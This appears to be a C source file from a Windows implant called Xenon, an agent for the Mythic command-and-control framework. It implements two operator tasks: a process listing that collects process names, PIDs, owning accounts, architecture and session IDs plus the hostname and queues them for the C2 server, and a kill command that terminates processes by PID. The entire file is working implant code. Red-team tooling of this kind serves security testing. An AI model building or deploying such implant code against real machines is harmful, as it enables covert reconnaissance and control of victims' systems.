#include "Xenon.h"
#include "Tasks/Process.h"

#include "Spawn.h"
#include "Package.h"
#include "Parser.h"
#include "Task.h"
#include "Identity.h"

#include <tlhelp32.h>

#ifdef INCLUDE_CMD_PS

BOOL GetAccountNameFromToken(HANDLE hProcess, char* accountName, int length) 
{
	HANDLE hToken;
	BOOL result = OpenProcessToken(hProcess, TOKEN_QUERY, &hToken);
	if (!result)
		return FALSE;

	result = IdentityGetUserInfo(hToken, accountName, length);
	if (!result)
		return FALSE;

	CloseHandle(hToken);
	return result;
}

VOID ProcessList(PCHAR taskUuid, PPARSER arguments) 
{
    // Get command arguments for filepath
    UINT32 nbArg = ParserGetInt32(arguments);
    _dbg("\t Got %d arguments", nbArg);

    char accountName[2048] = { 0 };

    // Output data
    PPackage locals = PackageInit(0, FALSE);

	char* arch;
	if (IsWow64ProcessEx(GetCurrentProcess())) {
		arch = "x86";
	} else {
		arch = "x64";
	}

	HANDLE toolhelp = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (toolhelp == INVALID_HANDLE_VALUE) {
		goto cleanup;
	}

	PROCESSENTRY32 pe = { sizeof(PROCESSENTRY32) };
	if (Process32First(toolhelp, &pe)) {
		do {
			HANDLE hProcess = OpenProcess(SelfIsWindowsVistaOrLater() ? PROCESS_QUERY_LIMITED_INFORMATION : PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID);
			DWORD sid;
			if (hProcess) {
				if (!GetAccountNameFromToken(hProcess, accountName, sizeof(accountName))) {
					_err("Failed to get account from token : %s", pe.szExeFile);
					accountName[0] = '\0';
				}
				if (!ProcessIdToSessionId(pe.th32ProcessID, &sid)) {
					sid = -1;
				}

				BOOL isWow64 = IsWow64ProcessEx(hProcess);

				PackageAddFormatPrintf(locals,
                    FALSE,
					"%s\t%d\t%d\t%s\t%s\t%d\n",
					pe.szExeFile,
					pe.th32ParentProcessID,
					pe.th32ProcessID,
					isWow64 ? "x86" : arch,
					accountName,
					sid);
			}
			else {
				PackageAddFormatPrintf(locals,
                    FALSE,
					"%s\t%d\t%d\n",
					pe.szExeFile,
					pe.th32ParentProcessID,
					pe.th32ProcessID);
			}
			CloseHandle(hProcess);
		} while (Process32Next(toolhelp, &pe));

	} else {
        DWORD error = GetLastError();
        PackageError(taskUuid, error);
        goto cleanup;
	}

    /* Mythic Process Browser: dedicated message type with host + TSV body */
    {
        CHAR hostname[MAX_COMPUTERNAME_LENGTH + 1] = { 0 };
        DWORD hostnameLen = (DWORD)sizeof(hostname);
        if (!GetComputerNameA(hostname, &hostnameLen)) {
            hostname[0] = '\0';
        }

        PPackage data = PackageInit(0, FALSE);
        PackageAddByte(data, PROCESS_BROWSER);
        PackageAddString(data, taskUuid, FALSE);
        PackageAddByte(data, TASK_COMPLETE);
        PackageAddString(data, hostname, TRUE); /* length-prefixed host for Mythic process matching */
        if (locals != NULL && locals->buffer != NULL && locals->length > 0) {
            PackageAddBytes(data, (PBYTE)locals->buffer, locals->length, TRUE);
        } else {
            PackageAddInt32(data, 0);
        }
        PackageQueue(data);
    }

cleanup:
	if (toolhelp)
		CloseHandle(toolhelp);

    PackageDestroy(locals);
}
#endif	//INCLUDE_CMD_PS

#ifdef INCLUDE_CMD_KILL
VOID ProcessKill(PCHAR taskUuid, PPARSER arguments)
{
    UINT32 nbArg = ParserGetInt32(arguments);
    _dbg("\t Got %d arguments", nbArg);

    if (nbArg == 0)
	{
        PackageError(taskUuid, ERROR_INVALID_PARAMETER);
        return;
    }

    UINT32 pid = ParserGetInt32(arguments);
    _dbg("Trying to kill pid : %d", pid);

    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    if (!hProcess)
	{
        DWORD error = GetLastError();
        _err("Could not open process %d ERROR : %d", pid, error);
        PackageError(taskUuid, error);
        return;
    }

    if (!TerminateProcess(hProcess, 1))
	{
        DWORD error = GetLastError();
        _err("Could not terminate process %d ERROR : %d", pid, error);
        CloseHandle(hProcess);
        PackageError(taskUuid, error);
        return;
    }

    CloseHandle(hProcess);
    PackageComplete(taskUuid, NULL);
}
#endif	//INCLUDE_CMD_KILL